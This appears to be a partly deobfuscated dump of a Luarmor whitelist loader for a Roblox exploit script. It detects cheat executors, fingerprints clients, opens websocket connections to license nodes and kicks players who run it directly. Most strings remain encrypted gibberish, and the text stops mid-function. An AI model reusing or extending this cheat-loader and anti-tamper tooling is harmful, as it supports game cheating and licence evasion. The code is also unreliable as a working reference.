-- Dump By Aeroz hub

@q3cg  

https://discord.gg/ZusW3VnQCf


-- Luraph runtime function (from the VM object, not part of the script: not lifted).
-- LPH_ENCFUNC decrypts a function this way: (key, encrypted buffer, ...) -> function.
local function luraph_runtime1(...)
	error("Luraph runtime function, not devirtualized")
end

local v = table.pack(...)

if not ce_like_loadstring_fn then
	if not l_fastload_enabled or not is_from_loader then
		game:GetService("Players").LocalPlayer:Kick("[Luarmor]: Use the loadstring, do not run this directly")
		wait(5)

		while true do
		end
	end
end

local str = "?"
loadstring = ce_like_loadstring_fn or loadstring
local flag = false

pcall(function()
	flag = true
	local UserGameSettings = UserSettings():GetService("UserGameSettings")

	if not UserGameSettings:GetTutorialState("nil  nil  ") then
		str = ""
		local n = ({ wait() })[1] * 1000000

		local function fn(arg)
			local n2 = 1103515245
			local n3 = 12345
			local n4 = 99999999
			local n5 = arg % 2147483648
			local n6 = 1

			return function(arg2, arg3)
				local v2 = n4
				local n7 = n2 * n5 + n3
				local n8 = n7 % v2 + n6
				n6 += 1
				n5 = n8
				n3 = n7 % 4858 * v2 % 5782
				return arg2 + n8 % arg3 - arg2 + 1
			end
		end

		local v2 = fn(n - n % 1)
		UserGameSettings:SetTutorialState("nil  nil  ", true)
		local n2 = 0

		for i = 1, 16 do
			local n3 = 0
			local n4 = 1

			for i2 = 1, 5 do
				local flag2 = v2(10, 20) > 15
				UserGameSettings:SetTutorialState("nil  nil  " .. n2, flag2)
				n3 += (flag2 and 1 or 0) * n4
				n4 *= 2
				n2 += 1
			end

			str ..= ("qwertyuiopasdfghjklzxcvbnm098765"):sub(n3 + 1, n3 + 1)
		end
	else
		str = ""
		local n = 0

		for i = 1, 16 do
			local n2 = 0
			local n3 = 1

			for i2 = 1, 5 do
				n2 += (UserGameSettings:GetTutorialState("nil  nil  " .. n) and 1 or 0) * n3
				n3 *= 2
				n += 1
			end

			str ..= ("qwertyuiopasdfghjklzxcvbnm098765"):sub(n2 + 1, n2 + 1)
		end
	end
end)

while not flag do
end

local now = os.clock()

if devsignature_sig then
	print([[        Luarmor - Lua whitelist service
        This is a signature - If you are seeing this, you know what not to do :3
        Have a good day!
        https://luarmor.net/
    ]])
end

local flag2 = nil
local flag3 = nil
local v2 = ({ table.unpack(v, 1, v.n) })[3]

if v2 and v2[1] then
end

local floor = math.floor
local random = math.random
local remove = table.remove
local char = string.char
local n = 0
local n2 = 2
local tbl = {}
local tbl2 = {}

for i = 1, 256 do
	tbl2[i] = i
end

repeat
	local v3 = random(1, #tbl2)
	local v4 = remove(tbl2, v3)
	tbl[v4] = char(v4 - 1)
until #tbl2 == 0

local tbl3 = {}

local function fn()
	if #tbl3 == 0 then
		n = (n * 149 + 4033097371307) % 35184372088832

		repeat
			n2 = n2 * 37 % 257
		until n2 ~= 1

		local n3 = n2 % 32
		local n4 = floor(n / 2 ^ (13 - (n2 - n3) / 32)) % 4294967296 / 2 ^ n3
		local n5 = floor(n4 % 1 * 4294967296) + floor(n4)
		local n6 = n5 % 65536
		local n7 = (n5 - n6) / 65536
		local n8 = n6 % 256
		local n9 = n7 % 256
		tbl3 = { n8, (n6 - n8) / 256, n9, (n7 - n9) / 256 }
	end

	return table.remove(tbl3)
end

local tbl4 = {}
local v3 = tbl4

local function fn2(arg, arg2)
	local v4 = tbl4

	if not v4[arg2] then
		tbl3 = {}
		local v5 = tbl
		n = arg2 % 35184372088832
		n2 = arg2 % 255 + 2
		v4[arg2] = ""
		local n3 = 77

		for i = 1, #arg do
			n3 = (string.byte(arg, i) + fn() + n3) % 256
			v4[arg2] = v4[arg2] .. v5[n3 + 1]
		end
	end

	return arg2
end

local v4 = LUARMOR_SkipAntidebugDevMode
local v5 = LUARMOR_AllowKeyCheckSkip
local flag4 = ff97f23b97f93792992999 and ff97f23b97f93792992999() == v3[fn2("\172", 31126577901884)] or false
local v6 = v3[fn2("6\143K\188=\r\226\146\248&\176;\3\231Æ\133\143\248\204_\184\222\229\157\254\25", 2340828612740)]
local v7 = USE_NON_SSL_NODE
local v8 = l_fastload_enabled
local n3 = os[v3[fn2("(\204\6\168", 4882453074371)]](os[v3[fn2("UC\178}", 12971197083440)]](v3[fn2("\139L", 33012126087192)])) - os[v3[fn2("vܢ\204", 5436520764359)]](os[v3[fn2("f\150\187#", 4318721413046)]](v3[fn2("\209\6D", 24300592814183)]))
local n4

if n3 < 0 then
	n4 = (86400 + -(-n3 % 86400)) % 86400
else
	n4 = n3 % 86400
end

local n5 = n4 / 3600

if n5 >= 21 or n5 < 5 then
	local tbl5 = {}
	local v9 = v3[fn2("\226XO\140q\210K\180:%\205B\254\182.y\229\163\245\219v$\209Y\171\6f", 3448963992716)]
	local v10 = v3[fn2("N\235X\233G\12\243\241ˣ@s\250\190\137\214\t\2267j\174\247\195\241\237\1\160", 16047561292385)]
	tbl5[1] = v9
	tbl5[2] = v10
	v6 = tbl5[math[v3[fn2("\195K\\\173\155:", 14086848885567)]](1, 2)]
elseif n5 >= 5 and n5 < 15 then
	local tbl5 = {}
	local v9 = v3[fn2("\136M\165r\0017j\254\186\147Ds\224x\241\151\231]k\137\28\184\17f,\138\149", 25839311805952)]
	local v10 = v3[fn2("\211:<?S\222\17[!\164Yl\240F\230\"\193\251\128\220a\29\252\133\u{87}\163", 2297877629020)]
	local v11 = v3[fn2("s\146p: \167\177_\228\255\136kW\246\245\253e\146M\245\19T\169IP\21\187", 2572763924828)]
	local v12 = v3[fn2("'\26L\252\146.\25c\151\208\248ϕ\154\r\229I\243\26\149\181\139k`+\16\2", 19333311546965)]
	local v13 = v3[fn2("$\1C\213\234\205?\169\200\"\188@\0\188\128\27C\244\12\203l\224\3p\245\187\233", 21697763200751)]
	local v14 = v3[fn2("\30\197\216\\\25\163\155i\1304i\2af\14\181\15\174MD\174\131\206\208Zã", 15465575462979)]
	local v15 = v3[fn2("\5ڝ_\154\171yf\184\193\138\26T\188\11\16#K\128\144:\7\197m\210\14\252", 30187025133009)]
	local v16 = v3[fn2("\182\186\142\199\t\163\189V 8\195g\230w\148\228\193v\199\\\186\212\246\174\130H\254", 19714501527480)]
	local v17 = v3[fn2("\248~\133\207\196r\178\244G\251 /\n\30\169\154%m\187W\141{\235\246\179\243\240", 7900833455294)]
	local v18 = v3[fn2("*\211\203v\129\12j\218\209A\222\15\186[S\135\165w\1725[tI\n \212\199", 17090196422188)]
	local v19 = v3[fn2("y\193\242QA\127\235\22\"\3\134\159.\0\5\224\130\236\239\27\254.\224\194ż\188", 25925213773392)]
	tbl5[1] = v9
	tbl5[2] = v10
	tbl5[3] = v11
	tbl5[4] = v12
	tbl5[5] = v13
	tbl5[6] = v14
	tbl5[7] = v15
	tbl5[8] = v16
	tbl5[9] = v17
	tbl5[10] = v18
	tbl5[11] = v19
	v6 = tbl5[math[v3[fn2("xԳ\192\182-", 34852575739594)]](1, 11)]
elseif n5 >= 15 and n5 < 21 then
	local tbl5 = {}
	local v9 = v3[fn2("\240\230R\240>\184pcy\16\164\25JH\231\14\235b\3\8\138b\1\249\194\4\255", 13222460338202)]
	local v10 = v3[fn2("\132\141w\195|l\143>'\247n\175\248+\249\226\144<C!*\177\160\233\21\2I", 27390916092837)]
	local v11 = v3[fn2("\rl\1903\128\248l\136-%\192js\153c\179\238b\157\207\209#\200;\238Nt", 14158791783298)]
	tbl5[1] = v9
	tbl5[2] = v10
	tbl5[3] = v11
	v6 = tbl5[math[v3[fn2("\237\238q\243\0025", 446690230688)]](1, 2)]
else
	game:GetService(v3[fn2("\11\19\5\4\2527\137", 10601376556689)])[v3[fn2("6\164p?\177pjs'\184]", 30941888671888)]]:Kick(v3[fn2("XЀ\129\142\231\6\145\130ښz\231[\253\250\28A\140`;m\\\243C\167d_\8뵟\11\24\4̩\172S\rH\235-E\0079\1519lH\149-C3\130)\225\20\162{1\228ܞ", 31900769383437)])
end

pcall(function()
	if game:GetService(v3[fn2("Y4\161\128j\n\206\18\4\2551z\235۾\220\26C\148", 26759536632153)]):GetCountryRegionForPlayerAsync(game:GetService(v3[fn2("A\209q\131\160\177\219", 8137063865754)])[v3[fn2("\255\189\244ˢ\218K\216I\131\254", 24768758536731)]]) == v3[fn2(";%", 6519959328696)] then
		local tbl5 = {}
		local v9 = v3[fn2("l\205hnf\2268}\206\25\1781{\11\1981/\224\8\179\240\27-\r\205#\151", 30974101909678)]
		local v10 = v3[fn2("\n\230\168\228\154T\28\183\22\226r\177\0\0042f+\129\184ʟ\193ͤ\166\128i", 12874557370070)]
		local v11 = v3[fn2("\31\140C\234\224\0128'uqF\230\160\26)\210ߣ\139\172\132w\172\181\245\250\246", 25825352736243)]
		local v12 = v3[fn2("Q\t\222t?\167\240\222K|Jn\228\232[\172OO\133\25\130Ϋ\203\24\190&", 1597776594384)]
		local v13 = v3[fn2("w׆z\184Rػ\135\17w\149\1628\245<t\183\218\"9\180&\154\173oS", 24407970273483)]
		tbl5[1] = v9
		tbl5[2] = v10
		tbl5[3] = v11
		tbl5[4] = v12
		tbl5[5] = v13
		v6 = tbl5[math[v3[fn2("\182\163/Pv\178", 434878710165)]](1, 5)]
	end
end)

local tbl5 = { [v3[fn2("$GBp\229(\220", 25758778711477)]] = v3[fn2("\233\191\12", 22757578724042)] }
tbl5[v3[fn2("\168)[\4", 30887126167645)]] = flag4 and LT_R_RRT_H or v3[fn2("\145\199\235ښ\255A\27", 5940121048476)] .. v6
tbl5[v3[fn2("-\187\163M\25\167\217@", 4026654723750)]] = "04d1ea57137b50c8a6f0bbedff50ec7f"
tbl5[v3[fn2("|\153\251\252\129+\213c\238\189\31]\198", 318911054121)]] = "0009"
tbl5[v3[fn2("\255u\7\188", 2453574945005)]] = "semi tp"

if v7 then
	tbl5[v3[fn2("P+\173\t", 11860914154278)]] = v3[fn2("\190\203\210Z\214\212\25ې\173pԼ\146\25\18\18\16\133\139\193獓ݓ\217", 22440815219107)]
	v6 = v3[fn2("_\12\235cw\2309\u{84}\23,d\224NS\22X\5\19p", 20241724852643)]
end

local flag5 = type(({ table.unpack(v, 1, v.n) })[1]) ~= v3[fn2("\242\19\150\29>", 10561646896748)]
local flag6 = false
local fn3 = nil
local n6 = nil
local tbl6 = nil
local tbl7 = nil
local flag7 = nil
local v9 = nil
local tbl8 = nil
local v10 = print
local v11 = next
local v12 = string[v3[fn2("2\2521\5", 29730670930984)]]
local v13 = identifyexecutor
local v14 = game
local v15 = pcall
local v16 = string[v3[fn2("\159\240\254\230\24\28", 19614640490331)]]
local v17 = debug[v3[fn2(";+\25\153&\188\15\128\26", 12781138980479)]]
local v18 = tonumber
local v19 = setmetatable
local v20 = rawget
local v21 = wait
local v22 = debug[v3[fn2("P\221{\181\235n\227", 23381441762575)]]
local v23 = loadstring
local v24 = os[v3[fn2("X\184mZ", 16176414243545)]]
local v25 = string[v3[fn2("U\235\251\154", 32087606162619)]]
local v26 = string[v3[fn2("\175\1522", 25909107154497)]]
local v27 = spawn
local v28 = game:GetService(v3[fn2("`B\166#\255jI\172]^", 4772928065885)])[v3[fn2("\160\129EكZ\5\18\24", 20189109897586)]]
local v29 = os[v3[fn2(">^S\159\159", 3206290934698)]]
local v30 = rconsoleprint
local v31 = math[v3[fn2("\165A7e", 11417445247369)]]
local v32 = tostring
local v33 = pairs
local v34 = string[v3[fn2("\3\155\250\194", 32580468700806)]]
local v35 = getgenv
local flag8 = false

local function fn4(arg, arg2)
	v23(v3[fn2("i\154\24+|X6!\178ڻ\204ηA\11\7\248<\206\28\245\222c\174\5\23\227\240?Iz\250a4S.\240\147t\199\0065\4\145\11\239\203\2.\2\179RLx́\21u\227䫨\150\172\226M~\4k\181K\16j\180\171\195\229\186Q`Os\148\164\206G\232\203+\165\2371w\233\198\6o\143r\8\253\219IJ\228\159L\163q<\148%\135>w\0\248\2╔>\132\n\186\20$h%\249\141\183n\228\206\15\1522\142\217\27\172\174\30\136\20_\165\174:6\177\167$\174[\132\130'D\184\251]\182\185,\237\203Ьt \241G\214\233*1\196#\180\205\242\196\192\248-V4\129Um\227\19\202\245h+\226<r\213\215p\24\224\235g\207\27mѬYuP4\19\231b3+\223ɑ?ս\251\244k\136\26\198\23\163@<\31M%\14\12\166FˆǼw]\187Sc\223r[\148T\191\183\179\179Q\11\208@\141w\205Ѫ>\171\u{557}\18\212\24-Lu\246ƾYo\236\4\254\11\234o\250\253\236\rZ\149\154I/\205H\181&\200:\227j\n\197\16\143\225\217\27\183\"\153\144\227\nW\254\\\180@\251\132\127b\128\174a\29\158\184\185,\19\187\178\242\247p\132i", 26167886831410)])(arg, arg2)

	while v21() do
	end
end

local tbl9 = {}
local flag9 = false
local v36 = string[v3[fn2("\189[J\156\131h", 30415739121318)]]
local v37 = string[v3[fn2("\1510\206", 13348091965583)]]
local v38 = table[v3[fn2("k\188*TG\222", 11500125891030)]]
local v39 = type
local v40 = v33
local v41 = v21
local v42 = coroutine[v3[fn2("\177߽\215", 9666118886186)]]

local fn5 = syn and syn[v3[fn2("Z\185\149\247\174\30\161\141\220", 26705847902503)]] and syn[v3[fn2("\137ҫ\217\r2\137v\146", 25551540215028)]][v3[fn2("fӟ\144\186|\152", 30015221198129)]] or WebSocket and WebSocket[v3[fn2("\202Be\155Q\245>", 758084862658)]] or WebsocketClient and function(arg)
	local v43 = WebsocketClient[v3[fn2("\188m\224", 16394390485924)]](arg)
	v43:Connect()
	return v43
end

local fn6 = nil

fn6 = function(arg)
	local tbl10 = {}

	for k, v43 in v40(arg) do
		local n7 = #tbl10 + 1
		local v44 = v3[fn2("'\200\247\146 \170_\227", 34886936526570)]
		local v45 = v3
		local flag10 = v39(v43) == v45[fn2("\20/x-\133", 7497094208326)] and fn6(v43)
		local str2

		if flag10 then
			str2 = flag10
		else
			local v46 = v3
			str2 = v3[fn2("=", 18649317131224)] .. v43 .. v46[fn2("Z", 173951484066)]
		end

		tbl10[n7] = v36(v44, k, str2)
	end

	return v3[fn2("i", 24314551883892)] .. v37(v38(tbl10), 0, -2) .. v3[fn2("\194", 22373167419748)]
end

local function fn7(arg)
	local function fn8(arg2)
		if arg2 == v3[fn2(",\196P\\", 10051603965073)] then
			if flag8 then
				local v43 = v3
				v30(v3[fn2("\188", 31749367165824)] .. os[v3[fn2("\0302\18I\236", 28036254623230)]]() .. v43[fn2("]F\213\251\200_\178F\20\156:\132P\20@C\245\5rT\147\137\228\134\r\254\141{\211", 1801793767054)])
			end

			arg[v3[fn2(",\186lJ\254\246p\224", 16202184833777)]] = tick()
			return
		end

		local v43 = v3
		local v44 = string[v3[fn2("\159\11\208\29\209", 9071247761664)]](arg2, v43[fn2("\188\201\31<\247\150\244\169-\6\18", 23326679258332)])

		if flag8 then
			local v45 = v3
			v30(v3[fn2("\7", 33022863833122)] .. os[v3[fn2("\127>\184\15\133", 17304951340788)]]() .. v3[fn2("\1651f.\12ԪaY\20\138\198\7\209a\154\252>\160v\31/\167'\18\249s3\138\161~*>", 22269011284227)] .. arg2 .. v45[fn2(" ", 17028991270387)])
		end

		if v44 then
			local v45 = arg[v3[fn2("Ƣn!\210\2\204y", 20264274119096)]][v44 + 0]
			local v46 = v3
			v45:Fire(arg2:gsub(v3[fn2("2\186\6u\237\151?\157\214\218\26", 16177488018138)], v46[fn2("", 19126073050516)]))
			return v45:Destroy()
		end

		return arg[v3[fn2("\222Jͮlw\170\t\1\159\242Xx\250i", 33181782472886)]]:Fire(arg2)
	end

	local fn9 = nil

	fn9 = function()
		if flag8 then
			local v43 = v3
			v30(v3[fn2("\20", 25372219857997)] .. os[v3[fn2("\31\244\136j\213", 5980924483010)]]() .. v43[fn2("\245\140.:\174\129O1!\183\\", 29455784635176)])
		end

		arg[v3[fn2("\154p\255\171h\15\253<\144\234\187\20\22\154\6", 7238314531413)]] = false

		if arg[v3[fn2("\150\184\188@_\170\153\19\224ڥ5", 8969239175329)]] or flag9 then
			if flag8 then
				v30(v3[fn2("\215̡\147q1\177\167\170\11O\146&\250\134\170g|", 12225997515898)])
			end

			return
		end

		local n7 = 0
		local v43

		while true do
			if flag8 then
				local v44 = v3
				v30(v3[fn2("\8", 25877967691300)] .. os[v3[fn2("\242\131\241\176\153", 32213237790000)]]() .. v44[fn2("\158\5\232\183M\152\162w\231Y\191\203\31\168H\18Cu\188<\171s\200\226N\20\133\25n\255\209ȴV\192\30ǁv", 28825478949085)])
			end

			local v44 = v24()
			local flag10 = false
			local v45 = nil
			v43 = nil

			v27(function()
				local v46, v47 = v15(fn5, arg[v3[fn2("\23\20\24", 29848786136214)]])
				v45 = v46
				v43 = v47
				flag10 = true
			end)

			while not flag10 and v24() < v44 + 8 do
				v41()
			end

			if flag8 then
				local v46 = v3
				v30(v3[fn2("\128", 29034864994720)] .. os[v3[fn2("\175\nP\245\156", 12251768106130)]]() .. v3[fn2("z\24ث\148\2523\254\223\1\222Q\227{\241\197\249\\\11_h\181", 34490713701753)] .. v32(flag10) .. v3[fn2("\127\132\31\28g\n", 10375883892159)] .. v32(v45) .. v46[fn2("\12", 27328637166443)])
			end

			if not flag10 then
				flag6 = false
				n7 = 10

				if flag8 then
					warn(v3[fn2("\226\255\210W,\15\226\250ESIn\195\237\222O\184\158,R\173\222\226\25\17\167\176R\229\224\251", 13362051035292)])
				end
			end

			if not v45 then
				n7 += 1

				if n7 > 5 then
					flag6 = false
				end

				v41(n7 < 4 and 10 or 120)
				continue
			end

			break
		end

		if flag8 then
			local v44 = v3
			v30(v3[fn2("\194", 33361102829917)] .. os[v3[fn2("nG\178p\189", 1458185897294)]]() .. v44[fn2("\148\235A|\17\230\0113\2209x\22|\149\178\167\141\242\182\164\19x\130\238", 2558804855119)])
		end

		arg[v3[fn2("\204*c\136֯\156\235c\228#\163\143\18\204", 14980229346943)]] = true
		arg[v3[fn2("\196\28p0\225\186\219]\246", 13544592716102)]] = v43
		flag6 = arg
		local v44 = v3

		v43:Send(fn6({
			[v3[fn2("\144\157\26\202J\143", 30815183269914)]] = v44[fn2("\158\177\19U", 18578448008086)],
			[v3[fn2("\222U\224\t", 256632127727)]] = {},
		}))

		v15(function()
			v43[v3[fn2("k(\166.\2433M", 11661192079980)]]:Connect(fn9)
			v43[v3[fn2("\15\210\249~|\227\202\248q", 12796171824781)]]:Connect(fn8)
		end)

		v15(function()
			v43[v3[fn2(" URU\22\156\133D\244\18\140\156u\238\15*", 31006315147468)]]:Connect(fn9)
			v43[v3[fn2("v\150P\222B\136';\166\162\1439", 3526275763412)]]:Connect(fn8)
		end)
	end

	v15(function()
		local v43 = v3
		arg[v3[fn2("\0Q8\178\17K1\246R", 27593859490914)]][v43[fn2("Q\211s\145*Q?", 8519327620862)]]:Connect(fn9)
		local v44 = v3
		arg[v3[fn2("\197,r \183r\1669N", 8460270018247)]][v44[fn2("Ó@Qd\143\153|\223", 32507452028482)]]:Connect(fn8)
	end)

	v15(function()
		local v43 = v3
		arg[v3[fn2("\29i\"\207\r\254\208\235\162", 33601628338749)]][v43[fn2("\127\0\163\179\239\249y\205g\245RE", 27001135915578)]]:Connect(fn8)
		local v44 = v3
		arg[v3[fn2("Z_\28\178_Aͣ8", 23336343229669)]][v44[fn2("h\177\227\15\189\1384\185\128\r\248H7\209\205\244", 11453953583531)]]:Connect(fn9)
	end)

	arg[v3[fn2("U0\18973y\172\177", 26105607905016)]] = tick()

	while v41(10) do
		if flag8 then
			local v43 = v3
			v30(v3[fn2("\145", 14951237432932)] .. os[v3[fn2("\2286\234N\229", 22975554966421)]]() .. v43[fn2("ח\31]\186]\218A}\226[{\251\17t\146էړg\20\toć:\170", 14658096969043)])
		end

		if arg[v3[fn2("\200tK\173\215\207e8\175\212\11Or\171\158", 15693215676695)]] then
			local v43 = v3

			arg[v3[fn2("t\168\177Eņ\218\30\232", 31886810313728)]]:Send(fn6({
				[v3[fn2("+\30H\139\251Z", 29989450607897)]] = v43[fn2("\234\23\201\8", 21721386241797)],
				[v3[fn2("\227o\137\144", 9220502430091)]] = {},
			}))

			if tick() - arg[v3[fn2("\161\183W҉G\174\t", 26743430013258)]] > 20 then
				if flag8 then
					local v44 = v3
					v30(v3[fn2("=", 25162833812362)] .. os[v3[fn2("\2501\245\132\"", 26944225862149)]]() .. v44[fn2("\240\161\251\171\150\228~\247ֶ\166T\188\2\n\31\4\nlA!\3P\242", 20296487356886)])
					warn(v3[fn2("\222\6\189\254ChVJX'\161Kl\129", 21935067385804)])
				end

				arg[v3[fn2("\156\156&\216d,<\149*", 15423698253852)]]:Close()
			end
		end
	end
end

tbl9.new = function(arg, arg2)
	local tbl10 = {}
	v19(tbl10, arg)
	arg[v3[fn2("\227t\243=\230\148\11", 15742609307973)]] = arg
	local v43 = v24()
	local flag10 = false
	local v44 = nil
	local v45 = nil

	v27(function()
		local v46, v47 = v15(fn5, arg2)
		v44 = v46
		v45 = v47
		flag10 = true
	end)

	while not flag10 and v24() < v43 + 8 do
		v41()
	end

	if not flag10 then
		flag6 = false
		error(v3[fn2("\184y\139\177~s\r\17\174\255$3ٲv\2472N_\151S\1428", 21285433757039)])
	end

	assert(v44, v45)
	arg[v3[fn2("\232\nl\8\221\198\244\158\162", 15444099971119)]] = v45
	arg[v3[fn2("\212\216b", 32886494459811)]] = arg2
	local v46 = v3
	arg[v3[fn2("\154\254+\5n)\173\161d\163\227\187\2262\186", 7107314031067)]] = Instance[v3[fn2("f̜", 13855987348072)]](v46[fn2("\12\2423\140\203\204q\2223\23\184\t\169", 19879862814802)])
	local v47 = v3
	arg[v3[fn2("\246M\198tb߸\2464", 4490525347926)]] = arg[v3[fn2(">RVz5\150\2A\180;\184ķ\181\202", 26856176345523)]][v47[fn2(">4z\139p", 25648179928398)]]
	arg[v3[fn2("sfê\t\245<\19", 6486672316313)]] = {}
	arg[v3[fn2("U\245\146]\170\143@8N@#\176\212\228\178", 12321563454675)]] = true
	v42(fn7)(arg)

	repeat
		v28:Wait()
	until arg[v3[fn2("\174\181j@\3-\232\22", 34774190194305)]]

	return tbl10
end

tbl9.request = function(arg, arg2)
	if flag8 then
		local v43 = v3
		v30(v3[fn2("v", 34172876422225)] .. os[v3[fn2("\1532\200F\140", 32307729954184)]]() .. v3[fn2("O\221\216+\241\133\255\226;\180\16\22\27\253\203\u{58C}\246l\7\148o\130TO\4\nO\140\200\0u?\140u\183\132J\245hS\144\30<\219\3", 4505558192228)] .. v32(arg[v3[fn2("\239調\168\155^Q\134(\151\189m\150\196", 22259347312890)]]) .. v43[fn2("\200", 12545982344612)])
	end

	local n7 = 0

	while not arg[v3[fn2("\214\240x\235\156NC\182\231{\193cx\215d", 1803941316240)]] do
		n7 += 1
		v41(0.1)
		if not (n7 > 40) then
			continue
		end

		if flag8 then
			warn(v3[fn2("\1950\131r\170\212EȪ\218Bil", 4536697655425)])
		end

		flag6 = false
		return v3[fn2("", 22063920336964)]
	end

	if flag8 then
		local v43 = v3
		v30(v3[fn2("Y", 27805393085735)] .. os[v3[fn2("\207\199us@", 9663971337000)]]() .. v43[fn2("bp\228\206D\24\1659\145\143\129bc\145\235\171\\\3\127[\2340x\247[\199GvH\160Q\147?\225̣w\tC", 19677993191318)])
	end

	local v43 = math[v3[fn2("\158\226\202\\\232\159", 458501751211)]](1, 99999999)
	local v44 = v3
	local v45 = Instance[v3[fn2("J\3\167", 23438351816004)]](v44[fn2("\203%q\241\205e\171\179\26\144\200.v", 12404244098336)])

	if flag8 then
		local v46 = v3
		v30(v3[fn2("o", 27769958524166)] .. os[v3[fn2(">\238W\231\186", 6757263513749)]]() .. v46[fn2("\221O\190w\196!\176\224\7\187#ʮgm\217c", 26137821142806)])
	end

	arg[v3[fn2("\227\197\200eba\232\t", 21769706098482)]][v43] = v45
	local v46 = v3

	arg[v3[fn2("\178\18Q\147\250:[\134\176", 17162139319919)]]:Send(fn6({
		[v3[fn2("~\148\234\238Ɗ", 22738250781368)]] = v46[fn2("\142YQϺ\16\149", 21390663667153)],
		[v3[fn2("s\182\11\31", 24974923258587)]] = arg2,
		[v3[fn2("\183\1", 1700858955312)]] = v43,
	}))

	if flag8 then
		local v47 = v3
		v30(v3[fn2("\215", 27636810474634)] .. os[v3[fn2("-O0\128\243", 26764905505118)]]() .. v47[fn2("\229\171\27\129\190\143\178\29\245<<\251}yL", 15506378897513)])
	end

	local flag10 = false

	v27(function()
		v41(30)

		if not flag10 then
			if flag8 then
				local v47 = v3
				v30(v3[fn2("\178", 20659423169320)] .. os[v3[fn2("͗q;\138", 2741346535929)]]() .. v47[fn2("\195wkZ\144wȺ\168\1644\255\201\252U=\131\243\6\174KR!\250\179?ä\203\200\249\131\225<=c\8\216H\2452C\236\245\5\156", 29761810394181)])
			end

			local v47 = arg[v3[fn2("į\140R\1966\251\147", 8061899644244)]][v43]
			v47:Fire(v3[fn2("", 10378031441345)])

			if flag8 then
				local v48 = v3
				v30(v3[fn2("\19", 4223155474269)] .. os[v3[fn2("\138J\234w\251", 2422435481808)]]() .. v48[fn2("\220\225Ȣ\212/\159\152\17\130\1\192\160\175\215+\170\142-\222\01938\151\237#G\250s}\166a\1", 34310319570129)])
			end

			return v47:Destroy()
		end
	end)

	local v47 = v45[v3[fn2("6y\14\152\246", 14892179830317)]]
	flag10 = true
	return (v47:Wait())
end

tbl9.close = function(arg)
	arg[v3[fn2("\241\199\234^{\15\210n\242Θ\147", 28222017627819)]] = true
	arg[v3[fn2("\248Ot\178\26\"\163W\188", 11388453333358)]]:Close()
end

local v43 = script_key or v3[fn2("O8\150\147", 28215574980261)]
local n7 = 0
local flag10 = false

v27(function()
	flag10 = true

	while not flag7 do
		n7 += 1
		v28:Wait()
	end
end)

while not flag10 do
	v28:Wait()
end

local function fn8()
	local v44 = n7

	while n7 == v44 do
		v28:Wait()
	end
end

local function fn9(arg)
	if arg then
		error("devirt: for loop without back edge")
	end

	while v21() do
	end
end

local function fn10(arg)
	for i = 1, 2 do
		local n8 = arg % 9915 + 4
		local n9 = nil
		local n10 = nil

		for i2 = 1, 3 do
			n9 = arg % 4155 + 3

			if i2 % 2 == 1 then
				n9 += 522
			end

			n10 = arg % 9996 + 1

			if n10 % 2 ~= 1 then
				n10 *= 3
			end
		end

		local n11 = arg % 9999995 + 1 + 5623
		local n12 = arg % 1000
		local n13 = fn3((arg - n12) / 1000) % 1000
		local n14 = arg % (n8 * n9 + 9999) + 5623
		arg = (n12 * n13 + n11 + arg % (419824125 - n11 + n12) + (n14 + n12 * n9 + n13) % 999999 * (n11 + n14 % n10)) % 99999999999
	end

	return arg
end

local n8 = 1
local v44 = syn and syn[v3[fn2("D\180\156f\239S\239", 24172813637616)]] or request or http_request

if v13 and ({ v13() })[1] == v3[fn2("\25\247}t\225\1\187", 7949153311979)] then
	n8 = 9
elseif v13 and ({ v13() })[1] == v3[fn2("\144\144T\182[\138\11\21\232z", 2290361206869)] then
	if ({ v13() })[2] == v3[fn2("@I\129", 19850870900791)] then
		n8 = 5
	else
		n8 = 2
	end
elseif FLUXUS_LOADED or EVON_LOADED or WRD_LOADED or COMET_LOADED or OZONE_LOADED or TRIGON_LOADED then
	n8 = 4
elseif KRNL_LOADED then
	n8 = 3
elseif Electron_Loaded then
	n8 = 6
elseif v13 and ({ v13() })[1] == v3[fn2("\171\192\220JXȜ", 12815499767455)] then
	n8 = 7
elseif v13 and ({ v13() })[1] == v3[fn2("\169\192C<\132\166", 18670792623084)] then
	n8 = 11
elseif v13 and ({ v13() })[1] == v3[fn2("\229\232Z}%\134\210K`", 16058299038315)] then
	n8 = 11
elseif v13 and ({ v13() })[1] == v3[fn2("v\191", 18668645073898)] then
	n8 = 11
elseif v13 and ({ v13() })[1] == v3[fn2("\138\203G|", 30760420765671)] then
	n8 = 11
elseif v13 and ({ v13() })[1] == v3[fn2("y\142\4\231\253", 9953890477110)] then
	n8 = 11
elseif v13 and ({ v13() })[1] == v3[fn2("h\16\196\"\236", 28973659842919)] then
	n8 = 15
end

if v13() == v3[fn2("\236<\200I", 5129421230761)] then
	n8 = 11
end

local function fn11(arg, arg2)
	tbl7 = {}
	tbl6 = {}

	for i = 0, arg do
		local v45 = v12(i)
		tbl6[i] = v45
		tbl6[v45] = i
	end

	for i = 1, #arg2 do
		local v45 = arg2[i]
		tbl7[i - 1] = v45
		tbl7[v45] = i - 1
	end
end

local tbl10 = {}
local v45 = v3[fn2("?", 4071753256656)]
local v46 = v3[fn2("\170", 20685193759552)]
local v47 = v3[fn2("\235", 33316004297011)]
local v48 = v3[fn2(" ", 9831480173508)]
local v49 = v3[fn2(".", 12166939913283)]
local v50 = v3[fn2("\188", 20310446426595)]
local v51 = v3[fn2("\30", 7856808696981)]
local v52 = v3[fn2("J", 30505936187130)]
local v53 = v3[fn2("\22", 31005241372875)]
local v54 = v3[fn2("y", 15134852888335)]
local v55 = v3[fn2("p", 7987809197327)]
local v56 = v3[fn2("\227", 12325858553047)]
local v57 = v3[fn2("M", 14182414824344)]
local v58 = v3[fn2(")", 20544529287869)]
local v59 = v3[fn2("F", 24744061721092)]
local v60 = v3[fn2("\174", 28931782633792)]
tbl10[1] = v45
tbl10[2] = v46
tbl10[3] = v47
tbl10[4] = v48
tbl10[5] = v49
tbl10[6] = v50
tbl10[7] = v51
tbl10[8] = v52
tbl10[9] = v53
tbl10[10] = v54
tbl10[11] = v55
tbl10[12] = v56
tbl10[13] = v57
tbl10[14] = v58
tbl10[15] = v59
tbl10[16] = v60
fn11(255, tbl10)

fn3 = function(arg)
	return arg - arg % 1
end

local function fn12(arg)
	local n9 = 1103515245
	local n10 = 12345
	local n11 = 99999999
	local n12 = arg % 2147483648
	local n13 = 1

	return function(arg2, arg3)
		local v61 = n11
		local n14 = n9 * n12 + n10
		local n15 = n14 % v61 + n13
		n13 += 1
		n12 = n15
		n10 = n14 % 4859 * v61 % 5781
		return arg2 + n15 % arg3 - arg2 + 1
	end
end

local function fn13(arg)
